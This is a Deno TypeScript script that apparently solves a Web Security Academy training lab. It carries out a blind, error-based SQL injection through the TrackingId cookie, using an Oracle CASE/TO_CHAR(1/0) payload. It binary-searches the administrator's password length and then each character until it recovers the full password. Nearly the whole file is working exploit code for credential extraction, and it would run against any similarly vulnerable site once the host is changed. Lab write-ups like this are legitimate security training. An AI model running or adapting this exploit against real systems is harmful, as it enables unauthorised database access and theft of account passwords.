import axios, { AxiosResponse } from "npm:axios@latest";

const HOST = "0a65000c0311b8fbc09b2744000d0047.web-security-academy.net";
const SESSION = "VTun9PtR3gl6NgNbK8g2qd51kk09RdPl";

function sleep(time: number): Promise<void> {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve();
    }, time);
  });
}

async function compareWithRemote(condition?: string) {
  await sleep(100);
  const query =
    `' UNION SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username = 'administrator' AND ${condition}) = 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual --`;
  try {
    await axios.get(`https://${HOST}/`, {
      headers: {
        Cookie: `TrackingId=${query};Session=${SESSION}`,
      },
    });
    return false;
  } catch {
    return true;
  }
}

async function findLengthOfPassword(
  higher: number,
  lower: number,
): Promise<number> {
  const value = Math.floor((higher + lower) / 2);
  await Deno.stdout.write(
    new TextEncoder().encode(`Passwordlength is: ${value}\r`),
  );
  if (value === lower || value === higher) {
    const isEqual = await compareWithRemote(`password = ${value}`);
    if (!isEqual) {
      throw new Error("No possibilities");
    }
    return value;
  }
  const isLower = await compareWithRemote(`LENGTH(password) < ${value}`);
  if (isLower) {
    return findLengthOfPassword(value, lower);
  }

  const isHigher = await compareWithRemote(`LENGTH(password) > ${value}`);
  if (isHigher) {
    return await findLengthOfPassword(higher, value);
  }

  const isEqual = await compareWithRemote(`LENGTH(password) = ${value}`);

  if (!isEqual) {
    throw new Error("No possibilities");
  }
  return value;
}

async function findPassword(length: number): Promise<string> {
  let password = "";

  for (let i = 1; i <= length; i++) {
    password += await findCharOfPassword("!", "z", i);
    await Deno.stdout.write(
      new TextEncoder().encode(`Password guess: ${password}\r`),
    );
  }

  await Deno.stdout.write(new TextEncoder().encode(`\n`));

  return password;
}

async function findCharOfPassword(
  higher: string,
  lower: string,
  index: number,
): Promise<string> {
  const value = String.fromCharCode(
    Math.floor((higher.charCodeAt(0) + lower.charCodeAt(0)) / 2),
  );
  if (value === lower || value === higher) {
    const isEqual = await compareWithRemote(
      `SUBSTR(password, ${index}, 1) = '${value}'`,
    );
    if (!isEqual) {
        throw new Error("No possibilities");
    }
    return value;
  }

  // Don't know why it's > instead of < but Ig we'll roll with it
  const isLower = await compareWithRemote(
    `SUBSTR(password, ${index}, 1) > '${value}'`,
  );
  if (isLower) {
    return findCharOfPassword(value, lower, index);
  }

  const isHigher = await compareWithRemote(
    `SUBSTR(password, ${index}, 1) < '${value}'`,
  );
  if (isHigher) {
    return findCharOfPassword(higher, value, index);
  }

  const isEqual = await compareWithRemote(
    `SUBSTR(password, ${index}, 1) = '${value}'`,
  );
  if (!isEqual) {
    throw new Error("No possibilities");
  }
  return value;
}

function isTrue(response: AxiosResponse<string>) {
  Deno.writeFileSync("result.html", new TextEncoder().encode(response.data));
  return response.data.includes('<p class="is-warning">');
}

const length = await findLengthOfPassword(100, 0);
Deno.stdout.writeSync(new TextEncoder().encode("\n"));
const password = await findPassword(length);
const passwordMatch = await compareWithRemote(`password = '${password}'`);
if (!passwordMatch) {
  console.error("Password does not match");
  Deno.exit(1);
}

console.log(`Password is: ${password}`);
